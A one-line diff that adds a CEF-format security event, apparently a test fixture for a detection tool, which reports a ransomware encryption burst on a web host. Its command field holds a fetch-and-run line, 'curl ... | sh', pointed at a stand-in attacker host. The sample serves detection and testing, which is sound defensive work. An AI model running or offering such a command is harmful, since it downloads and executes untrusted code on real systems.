@@ -1,0 +1,1 @@
+CEF:0|Zyvor AI Labs|Kavach|1.0|ransomware-burst|ransomware-burst|8|rt=1767323045123 cat=detection externalId=f1 dvchost=web-01 dvcpid=4242 msg=Burst of file encryption | a\=b sproc=/usr/bin/curl suid=1000 cs1Label=command cs1=curl http://evil.example/x | sh cs2Label=tags cs2=ransomware,t1486 cs3Label=mitreTechnique cs3=T1486 dst=203.0.113.9
